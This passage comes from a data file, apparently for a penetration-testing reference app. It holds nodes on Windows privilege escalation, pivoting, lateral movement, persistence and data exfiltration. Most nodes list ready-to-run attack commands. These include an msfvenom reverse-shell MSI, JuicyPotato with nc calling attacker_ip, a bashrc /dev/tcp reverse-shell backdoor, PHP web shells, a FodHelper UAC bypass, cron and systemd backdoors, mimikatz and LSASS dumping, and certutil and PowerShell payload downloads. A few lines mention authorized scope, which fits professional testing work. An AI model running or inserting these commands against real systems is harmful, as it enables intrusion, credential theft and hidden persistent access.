                                            description: 'Save output to file',
                                            code: '.\\winPEASx64.exe > output.txt'
                                        },
                                        {
                                            description: 'Run quietly (less output)',
                                            code: '.\\winPEASx64.exe quiet'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🔎',
                                    resources: [{
                                        title: 'PEASS-ng GitHub',
                                        url: 'https://github.com/carlospolop/PEASS-ng'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'win-enum-manual',
                                data: {
                                    label: 'Manual Enumeration',
                                    description: 'System & user info',
                                    descriptionMd: '### Manual Enumeration\nGather Windows system information, users, groups, and privileges.',
                                    commands: [{
                                            description: 'System info',
                                            code: 'systeminfo'
                                        },
                                        {
                                            description: 'Current user',
                                            code: 'whoami /all'
                                        },
                                        {
                                            description: 'List users',
                                            code: 'net user'
                                        },
                                        {
                                            description: 'Local groups',
                                            code: 'net localgroup'
                                        },
                                        {
                                            description: 'Network info',
                                            code: 'ipconfig /all && netstat -ano'
                                        },
                                        {
                                            description: 'Running processes',
                                            code: 'tasklist /v'
                                        },
                                        {
                                            description: 'Installed software',
                                            code: 'wmic product get name,version'
                                        },
                                        {
                                            description: 'Scheduled tasks',
                                            code: 'schtasks /query /fo LIST /v'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📋',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'kernel-exploit',
                                data: {
                                    label: 'Kernel Exploits',
                                    description: 'Missing Patches',
                                    descriptionMd: '### Kernel Exploits\nIdentify missing patches and leverage known vulnerabilities.\n\n**Notable exploits:**\n- MS16-032 (Secondary Logon)\n- MS17-010 (EternalBlue)\n- PrintSpoofer\n- HiveNightmare',
                                    commands: [{
                                            description: 'Watson (patch detection)',
                                            code: 'Watson.exe'
                                        },
                                        {
                                            description: 'Sherlock (PowerShell)',
                                            code: 'Import-Module .\\Sherlock.ps1; Find-AllVulns'
                                        },
                                        {
                                            description: 'Windows Exploit Suggester',
                                            code: 'python windows-exploit-suggester.py --database db.xls --systeminfo sysinfo.txt'
                                        },
                                        {
                                            description: 'Check patches',
                                            code: 'wmic qfe list'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🧠',
                                    resources: [{
                                            title: 'Watson GitHub',
                                            url: 'https://github.com/rasta-mouse/Watson'
                                        },
                                        {
                                            title: 'Sherlock GitHub',
                                            url: 'https://github.com/rasta-mouse/Sherlock'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'services-misconfig',
                                data: {
                                    label: 'Service Misconfig',
                                    description: 'Permissions & paths',
                                    descriptionMd: '### Service Misconfig\nExploit weak service permissions, unquoted paths, and DLL hijacking.\n\n**Check for:**\n- Writable service binary paths\n- Unquoted service paths\n- Weak service permissions\n- Writable service directories',
                                    commands: [{
                                            description: 'List all services',
                                            code: 'sc query state= all'
                                        },
                                        {
                                            description: 'Service details',
                                            code: 'sc qc ServiceName'
                                        },
                                        {
                                            description: 'Service permissions',
                                            code: 'accesschk.exe -uwcqv "Everyone" *'
                                        },
                                        {
                                            description: 'Find unquoted paths',
                                            code: 'wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'
                                        },
                                        {
                                            description: 'PowerUp (service abuse)',
                                            code: 'Import-Module .\\PowerUp.ps1; Invoke-AllChecks'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🧰',
                                    resources: [{
                                        title: 'PowerUp GitHub',
                                        url: 'https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'registry-autorun',
                                data: {
                                    label: 'Registry & Autorun',
                                    description: 'Persistence locations',
                                    descriptionMd: '### Registry Exploitation\nExploit writable registry keys and autorun locations for privilege escalation.\n\n**Key locations:**\n- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n- AlwaysInstallElevated\n- Service ImagePath keys',
                                    commands: [{
                                            description: 'Check AlwaysInstallElevated',
                                            code: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
                                        },
                                        {
                                            description: 'Check autorun keys',
                                            code: 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                                        },
                                        {
                                            description: 'Enumerate registry permissions',
                                            code: 'Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\* | Format-List'
                                        },
                                        {
                                            description: 'Exploit AlwaysInstallElevated',
                                            code: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=443 -f msi -o install.msi && msiexec /quiet /qn /i install.msi'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📝',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'token-impersonation',
                                data: {
                                    label: 'Token Impersonation',
                                    description: 'SeImpersonate & Potato attacks',
                                    descriptionMd: '### Token Impersonation\nExploit SeImpersonate or SeAssignPrimaryToken privileges.\n\n**Tools:**\n- Juicy Potato (Server 2016 and older)\n- Rogue Potato\n- PrintSpoofer\n- GodPotato',
                                    commands: [{
                                            description: 'Check privileges',
                                            code: 'whoami /priv'
                                        },
                                        {
                                            description: 'JuicyPotato',
                                            code: 'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c nc.exe attacker_ip 443 -e cmd.exe" -t *'
                                        },
                                        {
                                            description: 'PrintSpoofer',
                                            code: 'PrintSpoofer.exe -i -c cmd'
                                        },
                                        {
                                            description: 'GodPotato',
                                            code: 'GodPotato.exe -cmd "cmd /c whoami"'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎭',
                                    resources: [{
                                        title: 'Potato Exploits',
                                        url: 'https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'credentials-windows',
                                data: {
                                    label: 'Credential Hunting',
                                    description: 'Passwords & secrets',
                                    descriptionMd: '### Credential Hunting\nLocate stored credentials, password files, and sensitive data.\n\n**Common locations:**\n- Registry (autologon, putty sessions)\n- SAM/SYSTEM backups\n- Configuration files\n- PowerShell history',
                                    commands: [{
                                            description: 'Search for passwords',
                                            code: 'findstr /si password *.txt *.xml *.config *.ini'
                                        },
                                        {
                                            description: 'Registry autologon',
                                            code: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"'
                                        },
                                        {
                                            description: 'Saved credentials',
                                            code: 'cmdkey /list'
                                        },
                                        {
                                            description: 'PowerShell history',
                                            code: 'type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt'
                                        },
                                        {
                                            description: 'VNC passwords',
                                            code: 'reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"'
                                        },
                                        {
                                            description: 'WiFi passwords',
                                            code: 'netsh wlan show profile name="NETWORK" key=clear'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔑',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'uac-bypass',
                                data: {
                                    label: 'UAC Bypass',
                                    description: 'Elevation without prompt',
                                    descriptionMd: '### UAC Bypass\nBypass User Account Control to gain elevated privileges without triggering prompts.\n\n**Requirements:**\n- Medium integrity level\n- Member of Administrators group',
                                    commands: [{
                                            description: 'Check UAC level',
                                            code: 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA'
                                        },
                                        {
                                            description: 'Check integrity level',
                                            code: 'whoami /groups | findstr "Mandatory"'
                                        },
                                        {
                                            description: 'UACME (multiple methods)',
                                            code: 'Akagi64.exe 23 C:\\Windows\\System32\\cmd.exe'
                                        },
                                        {
                                            description: 'FodHelper bypass',
                                            code: 'New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force; New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "cmd.exe" -Force; Start-Process "C:\\Windows\\System32\\fodhelper.exe"'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🛡️',
                                    resources: [{
                                        title: 'UACME GitHub',
                                        url: 'https://github.com/hfiref0x/UACME'
                                    }]
                                },
                                children: []
                            }
                        ]
                    },

                    {
                        id: 'pivoting',
                        data: {
                            label: 'Pivoting',
                            description: 'Tunneling',
                            descriptionMd: '### Pivoting\nReach internal segments and move laterally through networks.',
                            commands: [],
                            type: 'category',
                            emoji: '🔀',
                            resources: []
                        },
                        children: [{
                                id: 'chisel',
                                data: {
                                    label: 'Chisel',
                                    description: 'Tunnel over HTTP',
                                    descriptionMd: '### Chisel\nFast TCP/UDP tunnel over HTTP, secured via SSH. Supports SOCKS5 proxy and port forwarding.\n\n**Use cases:**\n- Bypass firewalls\n- Access internal services\n- Create reverse tunnels',
                                    commands: [{
                                            description: 'Server (attacker)',
                                            code: 'chisel server -p 8000 --reverse'
                                        },
                                        {
                                            description: 'Client SOCKS5 (target)',
                                            code: 'chisel client attacker_ip:8000 R:socks'
                                        },
                                        {
                                            description: 'Port forward (local)',
                                            code: 'chisel client attacker_ip:8000 R:8080:127.0.0.1:80'
                                        },
                                        {
                                            description: 'Port forward (remote)',
                                            code: 'chisel client attacker_ip:8000 R:9090:internal_host:3389'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🕸️',
                                    resources: [{
                                        title: 'Chisel GitHub',
                                        url: 'https://github.com/jpillora/chisel'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'ssh-tunnel',
                                data: {
                                    label: 'SSH Tunnel',
                                    description: 'Port Forwarding',
                                    descriptionMd: '### SSH Tunnels\nLeverage SSH for local, remote, and dynamic port forwarding.\n\n**Types:**\n- Local: Access remote service locally\n- Remote: Expose local service remotely\n- Dynamic: SOCKS proxy',
                                    commands: [{
                                            description: 'Local forward',
                                            code: 'ssh -L 8080:127.0.0.1:80 user@target'
                                        },
                                        {
                                            description: 'Remote forward',
                                            code: 'ssh -R 8080:127.0.0.1:80 user@attacker'
                                        },
                                        {
                                            description: 'Dynamic (SOCKS)',
                                            code: 'ssh -D 1080 user@target'
                                        },
                                        {
                                            description: 'Jump host (ProxyJump)',
                                            code: 'ssh -J user@jump_host user@final_target'
                                        },
                                        {
                                            description: 'Background tunnel',
                                            code: 'ssh -fN -D 1080 user@target'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🧑‍💻',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'proxychains',
                                data: {
                                    label: 'Proxying',
                                    description: 'Route tools through pivot',
                                    descriptionMd: '### Proxychains\nRoute traffic through SOCKS/HTTP proxies. Configure in /etc/proxychains.conf or /etc/proxychains4.conf.\n\n**Tips:**\n- Use -q for quiet mode\n- Combine with Chisel/SSH SOCKS\n- TCP only (no UDP/ICMP)',
                                    commands: [{
                                            description: 'Configure proxychains',
                                            code: 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
                                        },
                                        {
                                            description: 'Run nmap through proxy',
                                            code: 'proxychains -q nmap -sT -Pn -p 80,443,3389 internal.host'
                                        },
                                        {
                                            description: 'Run any tool',
                                            code: 'proxychains curl http://internal.host'
                                        },
                                        {
                                            description: 'Chain multiple proxies',
                                            code: 'echo "socks5 proxy1 1080\nsocks5 proxy2 1080" >> /etc/proxychains.conf'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🧷',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'ligolo',
                                data: {
                                    label: 'Ligolo-ng',
                                    description: 'Advanced tunneling',
                                    descriptionMd: '### Ligolo-ng\nModern tunneling solution using TUN interfaces for transparent network access.\n\n**Advantages:**\n- Full network layer access\n- No SOCKS proxy needed\n- Multiple pivots supported\n- Better than Metasploit autoroute',
                                    commands: [{
                                            description: 'Start proxy server',
                                            code: 'sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert'
                                        },
                                        {
                                            description: 'Agent connection',
                                            code: './agent -connect attacker_ip:11601 -ignore-cert'
                                        },
                                        {
                                            description: 'Add route (attacker)',
                                            code: 'sudo ip route add 172.16.0.0/24 dev ligolo'
                                        },
                                        {
                                            description: 'Start tunnel (in proxy)',
                                            code: 'session -> start'
                                        },
                                        {
                                            description: 'Listener (pivot listening)',
                                            code: 'listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🌐',
                                    resources: [{
                                        title: 'Ligolo-ng GitHub',
                                        url: 'https://github.com/nicocha30/ligolo-ng'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'socat',
                                data: {
                                    label: 'Socat',
                                    description: 'Port forwarding & relays',
                                    descriptionMd: '### Socat\nVersatile relay tool for TCP/UDP port forwarding and file transfers.\n\n**Use cases:**\n- Port redirection\n- Shell relays\n- Encrypted tunnels',
                                    commands: [{
                                            description: 'Port forward',
                                            code: 'socat TCP-LISTEN:8080,fork TCP:internal_host:80'
                                        },
                                        {
                                            description: 'Reverse shell relay',
                                            code: 'socat TCP-LISTEN:4444 TCP:attacker_ip:443'
                                        },
                                        {
                                            description: 'Encrypted listener',
                                            code: 'socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:/bin/bash'
                                        },
                                        {
                                            description: 'UDP relay',
                                            code: 'socat UDP-LISTEN:53,fork UDP:internal_dns:53'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🔄',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'metasploit-pivot',
                                data: {
                                    label: 'Metasploit Pivoting',
                                    description: 'Autoroute & portfwd',
                                    descriptionMd: '### Metasploit Pivoting\nUse Meterpreter sessions for routing and port forwarding.\n\n**Modules:**\n- autoroute: Add routes to internal networks\n- portfwd: Forward specific ports\n- socks_proxy: Create SOCKS proxy',
                                    commands: [{
                                            description: 'Add route',
                                            code: 'run autoroute -s 172.16.0.0/24'
                                        },
                                        {
                                            description: 'Port forward',
                                            code: 'portfwd add -l 3389 -p 3389 -r internal_host'
                                        },
                                        {
                                            description: 'SOCKS proxy',
                                            code: 'use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun'
                                        },
                                        {
                                            description: 'Background session',
                                            code: 'background'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🎯',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'double-pivot',
                                data: {
                                    label: 'Multi-Hop Pivoting',
                                    description: 'Nested tunnels',
                                    descriptionMd: '### Multi-Hop Pivoting\nChain multiple pivots to reach deeply nested networks.\n\n**Strategy:**\n1. Establish first pivot\n2. Deploy tools on pivot host\n3. Create second tunnel through first\n4. Maintain operational security',
                                    commands: [{
                                            description: 'Chisel through SSH',
                                            code: 'ssh -L 8000:127.0.0.1:8000 user@pivot1\n# On pivot1: chisel server -p 8000 --reverse\n# On pivot2: chisel client 127.0.0.1:8000 R:socks'
                                        },
                                        {
                                            description: 'Nested proxychains',
                                            code: '# Configure chain: attacker -> pivot1 -> pivot2 -> target'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔗',
                                    resources: []
                                },
                                children: []
                            }
                        ]
                    },

                    {
                        id: 'lateral-movement',
                        data: {
                            label: 'Lateral Movement',
                            description: 'Move between systems',
                            descriptionMd: '### Lateral Movement\nTechniques for moving horizontally across the network to compromise additional systems.',
                            commands: [],
                            type: 'category',
                            emoji: '↔️',
                            resources: []
                        },
                        children: [{
                                id: 'psexec',
                                data: {
                                    label: 'PsExec',
                                    description: 'Remote execution',
                                    descriptionMd: '### PsExec\nExecute processes remotely using SMB and named pipes.\n\n**Requirements:**\n- Valid credentials\n- Admin$ share access\n- Port 445 open',
                                    commands: [{
                                            description: 'Sysinternals PsExec',
                                            code: 'PsExec.exe \\\\target -u domain\\user -p password cmd.exe'
                                        },
                                        {
                                            description: 'Impacket psexec',
                                            code: 'psexec.py domain/user:password@target'
                                        },
                                        {
                                            description: 'Pass-the-hash',
                                            code: 'psexec.py -hashes :ntlmhash domain/user@target'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '⚡',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'wmiexec',
                                data: {
                                    label: 'WMI Execution',
                                    description: 'Windows Management',
                                    descriptionMd: '### WMI Execution\nExecute commands via Windows Management Instrumentation. More stealthy than PsExec.\n\n**Advantages:**\n- No service installation\n- Less IOCs\n- Port 135 + dynamic RPC',
                                    commands: [{
                                            description: 'Impacket wmiexec',
                                            code: 'wmiexec.py domain/user:password@target'
                                        },
                                        {
                                            description: 'Pass-the-hash',
                                            code: 'wmiexec.py -hashes :ntlmhash domain/user@target'
                                        },
                                        {
                                            description: 'PowerShell WMI',
                                            code: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName target'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🔧',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'winrm',
                                data: {
                                    label: 'WinRM',
                                    description: 'Remote PowerShell',
                                    descriptionMd: '### WinRM\nWindows Remote Management for PowerShell remoting.\n\n**Requirements:**\n- Port 5985 (HTTP) or 5986 (HTTPS)\n- Valid credentials\n- Remote Management enabled',
                                    commands: [{
                                            description: 'Evil-WinRM',
                                            code: 'evil-winrm -i target -u user -p password'
                                        },
                                        {
                                            description: 'Pass-the-hash',
                                            code: 'evil-winrm -i target -u user -H ntlmhash'
                                        },
                                        {
                                            description: 'PowerShell remoting',
                                            code: 'Enter-PSSession -ComputerName target -Credential domain\\user'
                                        },
                                        {
                                            description: 'Upload file',
                                            code: 'upload /local/file.exe C:\\Temp\\file.exe'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '💻',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'rdp',
                                data: {
                                    label: 'RDP',
                                    description: 'Remote Desktop',
                                    descriptionMd: '### Remote Desktop Protocol\nInteractive desktop access to Windows systems.\n\n**Detection risk:** High (interactive session)\n**Operational security:** Use only when necessary',
                                    commands: [{
                                            description: 'xfreerdp',
                                            code: 'xfreerdp /u:user /p:password /v:target'
                                        },
                                        {
                                            description: 'Pass-the-hash',
                                            code: 'xfreerdp /u:user /pth:ntlmhash /v:target'
                                        },
                                        {
                                            description: 'Restricted Admin',
                                            code: 'xfreerdp /u:user /pth:ntlmhash /v:target /restricted-admin'
                                        },
                                        {
                                            description: 'rdesktop',
                                            code: 'rdesktop -u user -p password target'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🖥️',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'dcom',
                                data: {
                                    label: 'DCOM Execution',
                                    description: 'Distributed COM',
                                    descriptionMd: '### DCOM Lateral Movement\nAbuse DCOM objects for remote execution.\n\n**Stealthy alternative** to traditional methods.',
                                    commands: [{
                                            description: 'MMC20 Application',
                                            code: '$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target")); $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")'
                                        },
                                        {
                                            description: 'ShellWindows',
                                            code: '$com = [Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target")); $com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎪',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'ssh-lateral',
                                data: {
                                    label: 'SSH Keys',
                                    description: 'Linux lateral movement',
                                    descriptionMd: '### SSH Lateral Movement\nUse stolen SSH keys or credentials for lateral movement on Linux systems.\n\n**Look for:**\n- Private keys in ~/.ssh/\n- authorized_keys for access\n- SSH agent forwarding',
                                    commands: [{
                                            description: 'Use stolen key',
                                            code: 'chmod 600 id_rsa && ssh -i id_rsa user@target'
                                        },
                                        {
                                            description: 'Find SSH keys',
                                            code: 'find / -name id_rsa -o -name id_dsa 2>/dev/null'
                                        },
                                        {
                                            description: 'Add authorized key',
                                            code: 'echo "ssh-rsa YOUR_PUB_KEY" >> ~/.ssh/authorized_keys'
                                        },
                                        {
                                            description: 'SSH agent hijacking',
                                            code: 'SSH_AUTH_SOCK=/tmp/ssh-agent.sock ssh user@target'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔐',
                                    resources: []
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'persistence',
                        data: {
                            label: 'Persistence',
                            description: 'Maintain access',
                            descriptionMd: '### Persistence\nMaintain access to compromised systems for continued testing.\n\n**Note:** Always document and remove persistence mechanisms during cleanup.',
                            commands: [],
                            type: 'category',
                            emoji: '🔒',
                            resources: []
                        },
                        children: [{
                                id: 'linux-persistence',
                                data: {
                                    label: 'Linux Persistence',
                                    description: 'Backdoors & triggers',
                                    descriptionMd: '### Linux Persistence\nVarious methods to maintain access on Linux systems.\n\n**Common techniques:**\n- SSH keys\n- Cron jobs\n- Service modifications\n- Shell profile modifications',
                                    commands: [{
                                            description: 'Add SSH key',
                                            code: 'mkdir -p ~/.ssh && echo "ssh-rsa YOUR_KEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
                                        },
                                        {
                                            description: 'Cron persistence',
                                            code: '(crontab -l ; echo "@reboot /tmp/.hidden/shell.sh") | crontab -'
                                        },
                                        {
                                            description: 'bashrc backdoor',
                                            code: 'echo \'bash -i >& /dev/tcp/attacker_ip/443 0>&1 &\' >> ~/.bashrc'
                                        },
                                        {
                                            description: 'Systemd service',
                                            code: 'cat > /etc/systemd/system/backdoor.service << EOF\n[Unit]\nDescription=System Service\n[Service]\nExecStart=/usr/bin/backdoor\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable backdoor'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🐧',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'windows-persistence',
                                data: {
                                    label: 'Windows Persistence',
                                    description: 'Registry & scheduled tasks',
                                    descriptionMd: '### Windows Persistence\nMaintain access through various Windows mechanisms.\n\n**Techniques:**\n- Registry Run keys\n- Scheduled tasks\n- Services\n- WMI event subscriptions',
                                    commands: [{
                                            description: 'Registry Run key',
                                            code: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f'
                                        },
                                        {
                                            description: 'Scheduled task',
                                            code: 'schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru System'
                                        },
                                        {
                                            description: 'Service creation',
                                            code: 'sc create BackdoorService binPath= "C:\\Windows\\Temp\\service.exe" start= auto'
                                        },
                                        {
                                            description: 'Startup folder',
                                            code: 'copy backdoor.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe"'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🪟',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'webshell',
                                data: {
                                    label: 'Web Shells',
                                    description: 'HTTP backdoors',
                                    descriptionMd: '### Web Shells\nPersist through web application access.\n\n**Types:**\n- PHP shells (webshell.php)\n- ASPX shells\n- JSP shells\n- Obfuscated variants',
                                    commands: [{
                                            description: 'Simple PHP shell',
                                            code: 'echo "<?php system($_GET[\'cmd\']); ?>" > shell.php'
                                        },
                                        {
                                            description: 'PHP reverse shell',
                                            code: 'echo "<?php exec(\'/bin/bash -c \"bash -i >& /dev/tcp/attacker_ip/443 0>&1\"\'); ?>" > shell.php'
                                        },
                                        {
                                            description: 'ASPX webshell',
                                            code: 'copy /b webshell.aspx C:\\inetpub\\wwwroot\\images\\update.aspx'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🌐',
                                    resources: []
                                },
                                children: []
                            }
                        ]
                    },

                    {
                        id: 'data-exfil',
                        data: {
                            label: 'Data Exfiltration',
                            description: 'Extract sensitive data',
                            descriptionMd: '### Data Exfiltration\nMethods for extracting data from compromised systems.\n\n**Important:** Only exfiltrate data explicitly authorized in the scope. Document all data handling.',
                            commands: [],
                            type: 'category',
                            emoji: '📤',
                            resources: []
                        },
                        children: [{
                                id: 'credential-dumps',
                                data: {
                                    label: 'Credential Dumping',
                                    description: 'Extract hashes & passwords',
                                    descriptionMd: '### Credential Dumping\nExtract credentials from memory and disk.\n\n**Linux:**\n- /etc/shadow\n- Process memory\n- Browser saved passwords\n\n**Windows:**\n- SAM/SYSTEM\n- LSASS memory\n- Credential Manager',
                                    commands: [{
                                            description: 'Linux shadow file',
                                            code: 'cat /etc/shadow'
                                        },
                                        {
                                            description: 'Mimikatz (Windows)',
                                            code: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
                                        },
                                        {
                                            description: 'Dump SAM/SYSTEM',
                                            code: 'reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive'
                                        },
                                        {
                                            description: 'Secretsdump (Impacket)',
                                            code: 'secretsdump.py -sam sam.hive -system system.hive LOCAL'
                                        },
                                        {
                                            description: 'LaZagne (multi-platform)',
                                            code: 'laZagne.exe all'
                                        },
                                        {
                                            description: 'Procdump LSASS',
                                            code: 'procdump.exe -ma lsass.exe lsass.dmp'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔓',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'file-transfer',
                                data: {
                                    label: 'File Transfer',
                                    description: 'Upload/download files',
                                    descriptionMd: '### File Transfer Methods\nVarious techniques for moving files between systems.\n\n**Choose based on:**\n- Available tools\n- Network restrictions\n- File size\n- Detection risk',
                                    commands: [{
                                            description: 'Python HTTP server',
                                            code: 'python3 -m http.server 8000'
                                        },
                                        {
                                            description: 'wget download',
                                            code: 'wget http://attacker_ip:8000/file'
                                        },
                                        {
                                            description: 'curl download',
                                            code: 'curl -O http://attacker_ip:8000/file'
                                        },
                                        {
                                            description: 'PowerShell download',
                                            code: 'IWR -Uri http://attacker_ip:8000/file -OutFile file.exe'
                                        },
                                        {
                                            description: 'certutil download',
                                            code: 'certutil -urlcache -split -f http://attacker_ip:8000/file file.exe'
                                        },
                                        {
                                            description: 'SCP transfer',
                                            code: 'scp file user@attacker_ip:/tmp/'
                                        },
                                        {
                                            description: 'Netcat file send',
                                            code: 'nc -lvnp 443 > file.zip  # receiver\ncat file.zip | nc attacker_ip 443  # sender'
                                        },
                                        {
                                            description: 'Base64 exfil (small files)',
                                            code: 'cat file | base64 -w0'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📁',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'database-dump',
                                data: {
                                    label: 'Database Extraction',
                                    description: 'Export DB contents',
                                    descriptionMd: '### Database Extraction\nExtract data from databases found on compromised systems.\n\n**Important:** Only extract sample/proof data as authorized.',
                                    commands: [{
                                            description: 'MySQL dump',
                                            code: 'mysqldump -u root -p database > dump.sql'
                                        },
                                        {
                                            description: 'MySQL specific table',
                                            code: 'mysqldump -u root -p database table_name > table.sql'
                                        },
                                        {
                                            description: 'PostgreSQL dump',
                                            code: 'pg_dump -U postgres database > dump.sql'
                                        },
                                        {
                                            description: 'SQLite dump',
                                            code: 'sqlite3 database.db .dump > dump.sql'
                                        },
                                        {
                                            description: 'MSSQL export',
                                            code: 'bcp "SELECT * FROM database.dbo.table" queryout output.txt -S server -T -c'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '💾',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'screenshot-keylog',
                                data: {
                                    label: 'Screen & Keylogging',
                                    description: 'Capture user activity',
                                    descriptionMd: '### Screen & Keylogging\nCapture screenshots and keystrokes as proof of access.\n\n**Use sparingly** - privacy concerns and data sensitivity.',
                                    commands: [{
                                            description: 'Linux screenshot',
                                            code: 'import -window root screenshot.png'
                                        },
                                        {
                                            description: 'Windows screenshot (PS)',
                                            code: 'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("%{PRTSC}"); Start-Sleep -Seconds 1'
                                        },
                                        {
                                            description: 'Metasploit screenshot',
                                            code: 'screenshot'
                                        },
                                        {
                                            description: 'Metasploit keylogger',
                                            code: 'keyscan_start && keyscan_dump'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📸',
                                    resources: []
                                },
                                children: []
                            }
                        ]
                    },

                    {
                        id: 'impact-proof',
                        data: {
                            label: 'Impact Proof',
                            description: 'Demonstrate risk safely',
                            descriptionMd: '### Proof of Impact\nCollect minimal evidence to demonstrate risk without unnecessary data exposure.\n\n**Best practices:**\n- Access level achieved\n- Data classification impacted\n- Control bypass demonstrated\n- Repro steps & mitigations\n- Minimize data collection\n- Use hashes/checksums for files\n- Screenshots of access (not sensitive data)',
                            commands: [{
                                    description: 'Evidence hygiene',
                                    code: 'echo "$(date -Is) - Achieved root access via SUID exploitation" >> evidence.log'
                                },
                                {
                                    description: 'File proof (hash)',
                                    code: 'sha256sum /etc/shadow | tee proof.txt'
                                },
                                {
                                    description: 'Timestamp proof',
                                    code: 'date && hostname && id > proof-$(hostname)-$(date +%Y%m%d-%H%M%S).txt'
                                },
                                {
                                    description: 'Network proof',
                                    code: 'ip a && netstat -tulpn > network-proof.txt'
                                }
                            ],
                            type: 'technique',
                            emoji: '📸',
                            resources: []
                        },
                        children: []
                    },

                    {
                        id: 'cleanup',
                        data: {
                            label: 'Cleanup',
                            description: 'Revert changes',
